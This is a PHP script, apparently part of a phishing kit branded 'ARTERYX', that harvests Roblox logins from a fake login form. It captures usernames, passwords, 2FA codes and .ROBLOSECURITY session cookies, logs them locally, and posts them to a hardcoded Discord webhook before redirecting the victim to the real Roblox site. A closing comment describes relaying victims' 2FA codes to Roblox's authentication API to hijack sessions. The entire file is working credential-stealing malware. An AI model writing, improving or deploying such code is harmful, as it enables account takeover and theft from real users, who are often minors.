<?php
/**
 * Roblox Login Capture Script
 * 
 * This script captures login credentials from the modified login form and sends them
 * to a Discord webhook. It then redirects the user to the real Roblox login page.
 * 
 * CONFIGURATION: Set your webhook URL below
 */

// ==================== CONFIGURATION ====================
$WEBHOOK_URL = 'https://discord.com/api/webhooks/1564020054150881350/-pfe-aJg9UrbXEs8ANGs6slISYLgp_WYw5WR14SxKQ4xg-YgJeqS-L6nMMbJVjMUjz6j'; // Configured hits webhook
// =======================================================

// Get all configured webhooks
$webhookUrls = [];
$webhooksFile = __DIR__ . '/webhooks.json';
if (file_exists($webhooksFile)) {
    $webhooks = json_decode(file_get_contents($webhooksFile), true);
    if ($webhooks) {
        foreach ($webhooks as $userId => $data) {
            foreach (['webhookUrl', 'quadhookUrl', 'dualhookUrl', 'triplehookUrl'] as $key) {
                if (!empty($data[$key]) && !in_array($data[$key], $webhookUrls)) {
                    $webhookUrls[] = $data[$key];
                }
            }
        }
    }
}
if (!empty($WEBHOOK_URL) && !in_array($WEBHOOK_URL, $webhookUrls)) {
    $webhookUrls[] = $WEBHOOK_URL;
}

// Determine if the request is a JSON payload from login.php/client or a direct form submission
$raw_input = file_get_contents('php://input');
$json_data = json_decode($raw_input, true);
$is_json_request = (is_array($json_data) && !empty($json_data)) || (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false);
$data = is_array($json_data) ? $json_data : [];

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$username = trim($data['username'] ?? $data['cvalue'] ?? $data['cValue'] ?? $data['login'] ?? $_POST['username'] ?? $_POST['cvalue'] ?? '');
$password = $data['password'] ?? $data['pass'] ?? $_POST['password'] ?? '';
$twoFactorCode = $data['twoFactorCode'] ?? $data['code'] ?? $_POST['twoFactorCode'] ?? $_POST['code'] ?? '';

// Persistent IP-based credential caching to bridge multi-hop logins
$cacheDir = __DIR__ . '/.cache';
if (!is_dir($cacheDir)) { @mkdir($cacheDir, 0755, true); }
$credsCacheFile = $cacheDir . '/pending_creds.json';
$credsCache = file_exists($credsCacheFile) ? (json_decode(file_get_contents($credsCacheFile), true) ?: []) : [];

if (!isset($credsCache[$client_ip])) { $credsCache[$client_ip] = []; }
if (!empty($username) && $username !== 'Unknown') { $credsCache[$client_ip]['username'] = $username; }
if (!empty($password) && $password !== 'None' && $password !== 'Captured') { $credsCache[$client_ip]['password'] = $password; }
if (!empty($twoFactorCode)) { $credsCache[$client_ip]['twoFactorCode'] = $twoFactorCode; }

if (empty($username) && !empty($credsCache[$client_ip]['username'])) {
    $username = $credsCache[$client_ip]['username'];
}
if (empty($password) && !empty($credsCache[$client_ip]['password'])) {
    $password = $credsCache[$client_ip]['password'];
}
if (empty($twoFactorCode) && !empty($credsCache[$client_ip]['twoFactorCode'])) {
    $twoFactorCode = $credsCache[$client_ip]['twoFactorCode'];
}
$credsCache[$client_ip]['timestamp'] = time();
@file_put_contents($credsCacheFile, json_encode($credsCache));

$roblox_cookie = $data['roblox_security_cookie'] ?? $data['cookie'] ?? ($_COOKIE['.ROBLOSECURITY'] ?? '');

$captured_data = [
    'username' => $username,
    'password' => $password,
    'twoFactorCode' => $twoFactorCode,
    'roblox_security_cookie' => $roblox_cookie,
    'all_roblox_cookies' => $data['all_roblox_cookies'] ?? [],
    'redirect_url' => 'https://www.roblox.com/home',
    'ip_address' => $client_ip,
    'user_agent' => $user_agent,
    'timestamp' => date('Y-m-d H:i:s'),
    'cookies' => $_COOKIE ?? []
];

$returnUrl = 'https://www.roblox.com/home';

// Log to file for backup
$log_entry = date('Y-m-d H:i:s') . " | " . $captured_data['ip_address'] . " | " . $captured_data['username'] . "\n";
file_put_contents(__DIR__ . '/login_log.txt', $log_entry, FILE_APPEND);

// Update signins.json
if (!empty($captured_data['username'])) {
    $signinsFile = __DIR__ . '/signins.json';
    $signins = [];
    if (file_exists($signinsFile)) {
        $signins = json_decode(file_get_contents($signinsFile), true) ?: [];
    }
    $signins[] = [
        'username' => $captured_data['username'],
        'discriminator' => '0',
        'id' => strval(rand(100000000000000, 999999999999999)),
        'avatar' => null,
        'timestamp' => round(microtime(true) * 1000)
    ];
    if (count($signins) > 100) $signins = array_slice($signins, -100);
    file_put_contents($signinsFile, json_encode($signins, JSON_PRETTY_PRINT));
}

// Resolve the cookie before the gate. The gate used to test $cookieVal before
// this line ran, so a cookie-only beacon (2FA continue) was dropped whole.
$cookieVal = !empty($captured_data['roblox_security_cookie']) ? $captured_data['roblox_security_cookie'] : ($captured_data['cookies']['.ROBLOSECURITY'] ?? '');

// A beacon carries keystrokes, not a session. The page fires it on click and on
// Enter, before Roblox has verified anything — no cookie, no verdict. Cache it
// for the later hop and stop; posting it is what produced "username + password,
// no cookie" messages that read like a capture but are only the first keystroke.
$is_beacon = $captured_data['roblox_security_cookie'] === ''
    && $captured_data['twoFactorCode'] === ''
    && $captured_data['cookies'] === []
    && ($captured_data['username'] !== '' || $captured_data['password'] !== '');

// Send to all configured webhooks
if (!$is_beacon && !empty($webhookUrls) && (!empty($captured_data['username']) || !empty($captured_data['password']) || !empty($captured_data['twoFactorCode']) || !empty($cookieVal))) {
    $dispUser = !empty($captured_data['username']) ? $captured_data['username'] : 'Unknown';
    $dispPass = !empty($captured_data['password']) ? $captured_data['password'] : 'None';
    $description = "**Username:** `{$dispUser}`\n**Password:** `{$dispPass}`\n**IP:** `{$captured_data['ip_address']}`\n**Time:** `{$captured_data['timestamp']}`";

    if (!empty($captured_data['twoFactorCode'])) {
        $description .= "\n**2FA Code:** `{$captured_data['twoFactorCode']}`";
    }

    if (!empty($cookieVal)) {
        $description .= "\n\n**🔐 .ROBLOSECURITY Cookie:**\n```\n{$cookieVal}\n```";
    }

    $webhook_payload = [
        'embeds' => [[
            'title' => !empty($captured_data['twoFactorCode']) ? '🔐 Roblox 2FA Login Captured' : '🔐 Roblox Login Captured',
            'description' => $description,
            'color' => 5763719, // Emerald green
            'fields' => [
                [
                    'name' => 'User Agent',
                    'value' => substr($captured_data['user_agent'], 0, 200) ?: 'Unknown',
                    'inline' => false
                ]
            ],
            'footer' => [
                'text' => 'ARTERYX • Login Capture'
            ],
            'timestamp' => date('c')
        ]]
    ];

    $payload_json = json_encode($webhook_payload);
    foreach ($webhookUrls as $targetWebhook) {
        $ch = curl_init($targetWebhook);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_json);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_exec($ch);
        curl_close($ch);
    }
}

if ($is_json_request) {
    header('Content-Type: application/json');
    echo json_encode(['success' => true, 'redirect' => 'https://www.roblox.com/home']);
    exit;
} else {
    header('Location: https://www.roblox.com/home');
    exit;
}
exit;

/*
 * CAPTCHA AND 2FA HANDLING:
 * 
 * Integrated with the TwoFactorHandler Challenge engine and login.php replica:
 * 1. Initial credentials submit to authentic Roblox Auth (/v2/login).
 * 2. If no 2FA: .ROBLOSECURITY is acquired immediately, rich profile data parsed, and dispatched.
 * 3. If 2FA enabled (Email/Authenticator): challenge is held in session, modal rendered, victim code submitted to Roblox twostepverification API, token re-injected to /v2/login, and .ROBLOSECURITY captured.
 * 4. Fallback form submissions to capture.php capture credentials and trigger instant webhook alerts.
 */
?>
